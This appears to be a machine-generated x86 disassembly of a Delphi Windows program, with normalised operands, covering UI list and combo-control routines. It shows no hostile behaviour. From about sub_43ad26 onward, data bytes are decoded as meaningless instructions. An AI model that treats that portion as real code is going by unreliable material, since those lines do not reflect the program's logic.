mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a622
lea eax [ ebp - 0x18 ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_43a62c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0x28c ]
call sub_43bd84
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_43b6d8
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_43b4a0
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_43b580
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43b550
mov eax [ ebx + 0x20 ]
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
mov eax [ esp ]
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4188d4
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_43b80c
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4188d4
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_43a7c0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419a24
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ rw-data ]
call sub_403434
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403458
mov esi eax
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ esi + 0x28c ]
call sub_43a0c0
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_43b764
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_43b4a0
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_43b580
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43b550
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_4188d4
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_43a8dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43a140
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a0f8
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43a93c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45936c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43a978
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_419748
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_43a0c0
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_43a9e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_43a0c0
mov edx [ eax + 0x10 ]
mov eax edi
call sub_40408c
pop edi
pop esi
pop ebx
retn
sub_43aa18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_43a0c0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_43aa50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43aa7c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421820
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43ab30
sub_43aac0
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_43ab30
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_43ab30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43ac73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac7a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_43a0c0
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_43a0c0
mov ecx eax
mov edx ebx
mov eax edi
call sub_43a978
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_43a4fc
test al al
je r-xdata
sub_43ac88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43aca7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43acae
retn
sub_43acb4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43acec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ad11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad18
retn
sub_43ad26
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x53 ] bh
inc ebx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x24004032 ] bl
mov ah 0x43
add [ eax ] bh
mov ah 0x43
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
add al 0x35
jb r-xdata
outsb
outsb
je r-xdata
je r-xdata
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ esp + edi * 4 ] ch
inc ebx
add al cl
xchg ebx eax
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
pushfd
inc ebp
add [ eax ] ah
add [ eax ] al
[ eax + eax ]
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
inc eax
scasb [ edi ]
inc ebx
add [ edi ] al
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
inc ecx
xchg ebx eax
jb r-xdata
add [ eax - 0xfffbc6e ] bh
xor al 0x40
add ah bh
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
je r-xdata
sahf
inc ebx
add [ eax + 0x30004194 ] dh
mov ebp 0xbce00043
inc ebx
add [ esi + ebx * 4 - 0x4387ffbd ] cl
inc ebx
add [ esp + edi * 4 - 0x42ffffbd ] ch
inc ebx
add [ ebp + edi * 4 + 0x43 ] cl
add [ eax - 0x43 ] ch
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] ch
inc ebx
add [ eax ] bl
je r-xdata
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebp + edx * 4 + 0x41 ] bl
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add al cl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 + 0x41 ] ah
add [ eax - 0x66 ] ch
inc ecx
add [ esi + edi * 4 + 0x43 ] al
add [ eax ] ah
0x9a240041 0x41
pushad
xchg esi eax
inc ecx
add ah bl
xchg esi eax
inc ecx
add [ edi + ebx * 4 - 0x4147ffbd ] dl
inc ebx
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
cld
popad
jns r-xdata
inc ebp
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
clc
lodsd [ esi ]
inc ebx
add [ ecx + edx * 4 + 0x43 ] bh
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x41 ] ah
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
scasb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 ] ch
inc ebx
add [ eax ] ch
add [ eax ] al
add al ah
nop
inc ebx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
clc
lodsd [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x52 ] al
or [ edx - 0x4da3ffbd ] dh
inc ebx
js r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x34 ] bl
inc ebx
add [ eax ] cl
nop
xor eax 0x34f80040
inc eax
insd
jae r-xdata
jo r-xdata
insd
popad
dec ecx
outsb
js r-xdata
and al 0x0
inc eax
add [ edi + ebp * 4 ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] dh
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
inc ebx
add [ eax - 0x4bfffffe ] ah
hlt
sbb dh [ edx - 0x4db9ffbd ]
je r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
scasd [ edi ]
inc ebx
shl [ eax - 0x51 ] 0x43
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x43 ] bl
pushfd
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx ] bh
or al 0x45
imul ebp [ esi + 0x67 ] 0xb0809073
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
cld
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ecx + eax * 8 + 0x3bd00043 ] ch
inc ebp
add al bh
add eax [ ebp ]
and al 0x8f
add al [ eax ]
add [ esp + esi * 8 + 0x16cc0043 ] dh
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
js r-xdata
inc ecx
add [ eax ] dl
popfd
inc ecx
add [ eax ] cl
pushfd
inc ecx
add al ah
int 0x43
add [ esi + ecx * 8 ] al
inc ebx
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] bl
inc ebx
add al dl
mov al [ 0xffffffffcebc0041 ]
insd
jae r-xdata
adc [ edx ] al
add al 0x35
inc eax
add [ eax ] dh
je r-xdata
add [ eax ] al
add [ ebx + esi * 8 + 0x34f00043 ] bl
inc eax
add ah bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x180043b0
scasd [ edi ]
inc ebx
add [ ebx + edx * 4 + 0x43 ] al
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ecx
add [ edi + edi ] al
inc esp
add ah dh
retn
imul ebp [ esi + 0x67 ] 0x43afe073
add [ eax + 0x43f4 ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ebx
add al dl
into
inc ebx
add [ edi - 0x57e3ffbf ] dl
inc ecx
add ah ah
into
inc ebx
add [ ecx + ebp * 4 + 0x41 ] ah
add [ eax - 0x35 ] al
inc ebx
add [ ebx + ecx * 8 + 0x43 ] ah
add [ eax - 0x65 ] dl
inc ecx
add [ ebx + ecx * 8 - 0x3377ffbd ] dl
inc ebx
add [ esp + ecx * 8 - 0x5f83ffbd ] dl
inc ecx
add [ esi + ecx * 8 ] dh
inc ebx
add [ eax - 0x1bffbc32 ] al
mov [ 0xffffffffce880041 ] eax
inc ebx
add [ eax ] bl
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] cl
inc ecx
add [ esp - 0x3163ffbf ] bl
inc ebx
add al ah
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc ecx
add ah cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + ecx * 8 ] ah
inc ebx
add [ edi + ecx * 8 ] ch
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
insb
jae r-xdata
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + eax * 8 + 0x36e40043 ] al
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
insb
jae r-xdata
add al ah
scasd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43b0 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
mov dl 0x43
add [ esi - 0x4e ] al
add [ ebp - 0x4f07ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov dl 0x43
add [ edx + esi * 4 + 0x43 ] bl
sub_43b10a
inc ebx
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + eax * 8 + 0x36e40043 ] al
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_43b398
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42c4b0
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_43b3c4
push ebx
mov ebx eax
mov eax ebx
call sub_43b398
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_43b4a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_404444
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_40408c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_43b460
call sub_43b8d4
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_43b6bc
push eax
mov eax ebx
call sub_43b48c
xor ecx ecx
pop edx
call sub_42c6a4
mov eax ebx
call sub_43b460
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_43b460
mov eax [ eax + 0x23c ]
call sub_419748
test eax eax
jle r-xdata
mov eax ebx
call sub_43b460
call sub_43ba60
mov eax ebx
call sub_43b460
xor edx edx
call sub_43ba90
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_43b460
call sub_43ba9c
sub_43b550
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_43b460
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_43b460
call sub_43ba60
sub al 0x2
jne r-xdata
sub_43b580
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_43b6bc
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_43b48c
mov edx esp
call sub_42c5d8
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_43b6bc
push eax
mov eax esi
call sub_43b6bc
push eax
mov eax esi
call sub_43b460
pop edx
pop ecx
call sub_43b8b4
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_42c528
push eax
mov eax esi
call sub_43b6bc
push eax
mov eax esi
call sub_43b48c
pop edx
pop ecx
call sub_42c674
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_42c5bc
push eax
mov eax esi
call sub_43b6bc
push eax
mov eax esi
call sub_43b48c
pop edx
pop ecx
call sub_42c674
xor edi edi
sub_43b6e4
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b824
push esp
mov eax ebx
call sub_43b758
pop edx
call sub_42c5f0
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43b734
mov esi eax
test esi esi
jge r-xdata
sub_43b734
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4533bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_43b758
call sub_42c5ac
pop ebx
retn
sub_43b764
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_4533bc
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_43b758
mov edx esp
call sub_42c5c0
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402cbc
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_43b92c
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_43b7e4
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_43b758
mov ecx esp
or edx 0xffffffff
call sub_42c608
add esp 0x18
pop ebx
retn
sub_43b848
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43b460
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x24 ]
call sub_4044f8
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_43b460
mov esi eax
mov eax ebx
call sub_43b460
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43b8b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4530b8
mov ecx edi
mov edx esi
call sub_42c618
pop edi
pop esi
pop ebx
retn
sub_43b8e0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_43b92c
push ebp
